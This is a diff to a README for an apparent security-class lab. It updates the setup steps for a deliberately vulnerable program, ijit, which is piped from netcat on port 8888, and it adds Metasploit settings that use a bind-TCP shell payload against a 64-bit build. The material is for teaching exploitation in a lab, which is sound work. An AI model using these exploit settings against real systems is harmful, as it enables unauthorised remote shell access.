@@ -8,17 +8,18 @@ msfconsole hang at startup when it sees the executable git hooks!)
 
 ```
 cd
-git clone https://github.com/olawlor/ijit
+git clone https://github.com/olawlor/security
 mkdir -p ~/.msf4/modules/exploits/linux/ijit
 cd ~/.msf4/modules/exploits/linux/ijit
-ln -s ~/ijit/ijit.rb .
+ln -s ~/security/ijit/ijit.rb .
 ```
 
 Now compile and run the vulnerable program (compiled here as a 32-bit x86 program):
 
 ```
-cd ~/ijit
-gcc -m32 ijit.c -o ./ijit32 
+sudo apt-get install build-essential gcc gcc-multilib
+cd ~/security/ijit
+gcc -m32 ijit.c -g -o ./ijit32 
 nc -l -p 8888 | ./ijit32
 ```
 
@@ -35,4 +36,12 @@ set nop x86/single_byte
 set payload linux/x86/shell/bind_tcp
 exploit
 ```
+
+If you compile a 64-bit version of that executable, the same exploit
+will work with 
+```
+set nop x64/simple
+set payload linux/x64/shell/bind_tcp
+```
+
 
